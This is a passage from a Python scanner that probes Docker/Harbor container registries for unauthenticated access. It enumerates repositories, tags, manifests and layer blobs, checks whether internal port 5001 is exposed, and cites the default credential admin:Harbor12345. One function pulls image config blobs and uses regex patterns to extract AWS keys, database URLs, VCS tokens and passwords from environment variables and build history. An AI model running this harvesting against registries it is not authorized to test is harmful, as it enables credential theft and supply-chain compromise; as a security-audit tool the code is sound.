                    tags = _json.loads(tag_body).get("tags", []) or []
                except Exception:
                    pass
                findings.append({
                    "severity": "CRITICAL",
                    "title": "DOCKER_REGISTRY_TAGS_UNAUTH",
                    "detail": (
                        f"Docker image tags enumerable unauthenticated for '{repo}': "
                        f"{tags[:10]!r}; full version history readable, enabling "
                        f"targeted pull of specific or outdated releases"
                    ),
                    "host": host,
                    "port": port,
                })

            tag = tags[0] if tags else "latest"
            manifest_accept = (
                "application/vnd.docker.distribution.manifest.v2+json,"
                "application/vnd.oci.image.manifest.v1+json,*/*"
            )

            # Manifest
            man_status, _, man_body = _get(
                f"{base}/v2/{repo}/manifests/{tag}",
                extra_headers={"Accept": manifest_accept},
                tls=use_tls,
            )
            if man_status == 200:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "DOCKER_REGISTRY_MANIFEST_UNAUTH",
                    "detail": (
                        f"Docker image manifest '{repo}:{tag}' readable unauthenticated — "
                        f"layer digests, base OS, config digest, and build metadata exposed; "
                        f"enables precise layer pulls for secret extraction or CVE targeting"
                    ),
                    "host": host,
                    "port": port,
                })
                try:
                    mf = _json.loads(man_body)
                    layers = mf.get("layers", [])
                    if layers:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "DOCKER_IMAGE_LAYERS_EXPOSED",
                            "detail": (
                                f"Image '{repo}:{tag}' has {len(layers)} layer(s) with "
                                f"accessible blob digests; each layer is pullable without "
                                f"authentication via /v2/{repo}/blobs/<digest>; "
                                f"full filesystem tree of every layer is extractable"
                            ),
                            "host": host,
                            "port": port,
                        })
                        first_digest = layers[0].get("digest", "")
                        if first_digest:
                            blob_status, _, _ = _get(
                                f"{base}/v2/{repo}/blobs/{first_digest}",
                                tls=use_tls,
                            )
                            if blob_status in (200, 206):
                                findings.append({
                                    "severity": "HIGH",
                                    "title": "DOCKER_BLOB_DOWNLOAD_UNAUTH",
                                    "detail": (
                                        f"Docker layer blob downloadable unauthenticated — "
                                        f"GET /v2/{repo}/blobs/{first_digest[:40]}... → {blob_status}; "
                                        f"full layer filesystem extractable with 'tar xz'"
                                    ),
                                    "host": host,
                                    "port": port,
                                })
                except Exception:
                    pass

    elif status == 401:
        www_auth = (
            hdrs_map.get("WWW-Authenticate", "")
            or hdrs_map.get("www-authenticate", "")
        )
        if www_auth:
            findings.append({
                "severity": "HIGH",
                "title": "DOCKER_REGISTRY_AUTH_REQUIRED",
                "detail": (
                    f"Docker registry v2 API requires authentication — "
                    f"{scheme}://{host}:{port}/v2/ → 401; "
                    f"WWW-Authenticate: {www_auth[:160]}; "
                    f"default credentials (admin:Harbor12345) may still bypass auth"
                ),
                "host": host,
                "port": port,
            })

    # --- Harbor internal registry port 5001 ---
    if port != 5001:
        int_status, _, _ = _get(f"http://{host}:5001/v2/")
        if int_status is not None:
            findings.append({
                "severity": "HIGH",
                "title": "HARBOR_INTERNAL_REGISTRY_EXPOSED",
                "detail": (
                    f"Harbor internal distribution registry port 5001 reachable from network — "
                    f"http://{host}:5001/v2/ → {int_status}; "
                    f"this port is typically bound to loopback only; "
                    f"network exposure enables push/pull bypassing Harbor RBAC and audit log"
                ),
                "host": host,
                "port": 5001,
            })

    return findings


def probe_container_image_secrets(host: str, port: int = 5000, timeout: float = 10.0) -> list:
    """
    Extract secrets and credentials embedded in container image config blobs via the
    Docker Distribution v2 API without authentication.

    Covers env var credential leakage, AWS/DB/VCS token patterns, hardcoded CMD passwords,
    label information disclosure, and build-history RUN-command credential exposure.

    Informed by: command injection via unsanitized container CMD (ch.9), malicious file
    injection via exposed push surface (ch.6), and SSRF-facilitated registry pivots (ch.3)
    from Bug Bounty Hunting for Web Security.
    """
    import ssl
    import re
    import json as _json
    import urllib.request as _ureq
    import urllib.error as _uerr

    findings = []
    use_tls = (port == 443)
    scheme = "https" if use_tls else "http"
    base = f"{scheme}://{host}:{port}"

    def _tls_ctx():
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _get(url, extra_headers=None):
        hdrs = {"User-Agent": "ablation-probe/1.0"}
        if extra_headers:
            hdrs.update(extra_headers)
        try:
            req = _ureq.Request(url, headers=hdrs)
            if use_tls:
                with _ureq.urlopen(req, timeout=timeout, context=_tls_ctx()) as r:
                    return r.status, r.read()
            else:
                with _ureq.urlopen(req, timeout=timeout) as r:
                    return r.status, r.read()
        except _uerr.HTTPError as exc:
            return exc.code, exc.read()
        except Exception:
            return None, b""

    # Pre-compiled secret-detection patterns
    _PAT_SECRET = re.compile(
        r"(?i)(password|secret|(?<![A-Z])key(?![A-Z])|token|credential|api_key|apikey|passwd|pwd)"
    )
    _PAT_AWS = re.compile(r"(?i)(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY)")
    _PAT_DB = re.compile(r"(?i)DATABASE_URL")
    _PAT_VCS = re.compile(r"(?i)(GITHUB_TOKEN|GITLAB_TOKEN|GH_TOKEN|GL_TOKEN)")
    _PAT_CMD_CRED = re.compile(
        r"(?i)(-p\s+\S+|--password[=\s]\S+|password=\S{4,}|passwd=\S{4,})"
    )

    # Step 1: enumerate repositories
    cat_status, cat_body = _get(f"{base}/v2/_catalog")
    if cat_status != 200:
        return findings
    try:
        repos = _json.loads(cat_body).get("repositories", []) or []
    except Exception:
        return findings
    if not repos:
        return findings

    manifest_accept = (
        "application/vnd.docker.distribution.manifest.v2+json,"
        "application/vnd.oci.image.manifest.v1+json"
    )

    # Step 2: inspect up to 3 repos
    for repo in repos[:3]:
        # Resolve a usable tag
        man_status, man_body = _get(
            f"{base}/v2/{repo}/manifests/latest",
            extra_headers={"Accept": manifest_accept},
        )
        if man_status != 200:
            tag_status, tag_body = _get(f"{base}/v2/{repo}/tags/list")
            if tag_status == 200:
                try:
                    tags = _json.loads(tag_body).get("tags", []) or []
                    if tags:
                        man_status, man_body = _get(
                            f"{base}/v2/{repo}/manifests/{tags[0]}",
                            extra_headers={"Accept": manifest_accept},
                        )
                except Exception:
                    pass
        if man_status != 200:
            continue

        try:
            manifest = _json.loads(man_body)
        except Exception:
            continue

        # Config blob digest (Docker Schema v2 / OCI)
        config_digest = manifest.get("config", {}).get("digest", "")
        if not config_digest:
            continue

        cfg_status, cfg_body = _get(f"{base}/v2/{repo}/blobs/{config_digest}")
        if cfg_status != 200 or not cfg_body:
            continue

        try:
            config = _json.loads(cfg_body)
        except Exception:
            continue

        container_cfg = config.get("config", config.get("container_config", {})) or {}

        # --- Environment variable analysis ---
        env_list = container_cfg.get("Env", []) or []
        secret_hits, aws_hits, db_hits, vcs_hits = [], [], [], []

        for entry in env_list:
            name, _, value = entry.partition("=")
            if not value:
                continue
            if _PAT_AWS.search(name):
                aws_hits.append(entry[:100])
            elif _PAT_DB.search(name) and (":" in value and "@" in value):
                db_hits.append(entry[:100])
            elif _PAT_VCS.search(name):
                vcs_hits.append(entry[:100])
            elif _PAT_SECRET.search(name):
                secret_hits.append(entry[:100])

        if secret_hits:
            findings.append({
                "severity": "CRITICAL",
                "title": "IMAGE_ENV_SECRET_EXPOSED",
                "detail": (
                    f"Image '{repo}' config blob contains env vars matching secret "
                    f"name patterns: {secret_hits[:3]!r}; "
                    f"retrievable by any caller with registry read access via config blob"
                ),
                "host": host,
                "port": port,
            })

        if aws_hits:
            findings.append({
                "severity": "CRITICAL",
                "title": "IMAGE_AWS_CREDS_IN_ENV",
                "detail": (
                    f"Image '{repo}' embeds AWS credential env vars: {aws_hits!r}; "
                    f"static cloud keys in image config blob enable AWS account "
                    f"takeover by any unauthenticated registry reader"
                ),
                "host": host,
                "port": port,
            })

        if db_hits:
            findings.append({
                "severity": "CRITICAL",
                "title": "IMAGE_DB_CREDS_IN_ENV",
                "detail": (
                    f"Image '{repo}' embeds DATABASE_URL with embedded credentials: "
                    f"{db_hits!r}; connection string including username and password "
                    f"readable by any unauthenticated registry reader"
                ),
                "host": host,
                "port": port,
            })

        if vcs_hits:
            findings.append({
                "severity": "HIGH",
                "title": "IMAGE_VCS_TOKEN_IN_ENV",
                "detail": (
                    f"Image '{repo}' embeds VCS token(s) in env: {vcs_hits!r}; "
                    f"repo-scoped access tokens in image config enable source-code "
                    f"exfiltration and supply-chain tampering by any registry reader"
                ),
                "host": host,
                "port": port,
            })

        # --- CMD / ENTRYPOINT hardcoded credential flags ---
        cmd = container_cfg.get("Cmd", []) or []
        entrypoint = container_cfg.get("Entrypoint", []) or []
        cmd_str = " ".join(str(c) for c in cmd + entrypoint)
        if _PAT_CMD_CRED.search(cmd_str):
            findings.append({
                "severity": "CRITICAL",
                "title": "IMAGE_PASSWORD_IN_CMD",
                "detail": (
                    f"Image '{repo}' CMD/ENTRYPOINT contains hardcoded credential flags: "
                    f"{cmd_str[:160]!r}; password is visible in the image manifest "
                    f"to any unauthenticated registry reader and in 'docker inspect' output"
                ),
                "host": host,
                "port": port,
            })

        # --- Labels: information disclosure ---
        labels = container_cfg.get("Labels", {}) or {}
        if labels:
            findings.append({
                "severity": "MEDIUM",
                "title": "IMAGE_LABEL_DISCLOSURE",
                "detail": (
                    f"Image '{repo}' labels expose build metadata: "
                    f"{dict(list(labels.items())[:6])!r}; "
                    f"may disclose maintainer, git commit hash, CI system, or version "
                    f"information useful for targeted exploit selection"
                ),
                "host": host,
                "port": port,
            })

        # --- Build history: RUN commands with credential patterns ---
        history = config.get("history", []) or []
        for hist in history:
            run_cmd = hist.get("created_by", "")
            if _PAT_CMD_CRED.search(run_cmd) or _PAT_SECRET.search(run_cmd):
                findings.append({
                    "severity": "CRITICAL",
                    "title": "IMAGE_HISTORY_CRED_LEAK",
                    "detail": (
                        f"Image '{repo}' build history contains RUN command with "
                        f"credential pattern: {run_cmd[:160]!r}; "
                        f"even if the filesystem layer is squashed or deleted, the "
                        f"history entry remains in the manifest config blob and is "
                        f"readable without authentication"
                    ),
                    "host": host,
                    "port": port,
                })
                break  # one finding per repo for history leakage

    return findings


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Harbor registry enumeration for Orka RE")
    parser.add_argument("--host", default=HARBOR_DEFAULT_HOST)
    parser.add_argument("--user", default=HARBOR_DEFAULT_USER)
    parser.add_argument("--password", default=HARBOR_DEFAULT_PASS)
    parser.add_argument("--repo", default="library/tahoe-base")
    parser.add_argument("--tag", default=None)
    parser.add_argument("--layer-index", type=int, default=0)
    parser.add_argument("--probe-bytes", type=int, default=131072)
    args = parser.parse_args()

    e = HarborEnumerator(host=args.host, user=args.user, password=args.password)

    if args.tag:
        print(json.dumps(e.probe_bv41_layer(args.repo, args.tag, args.layer_index, args.probe_bytes), indent=2))
    else:
        result = e.run(args.repo)
        print(json.dumps(result, indent=2))
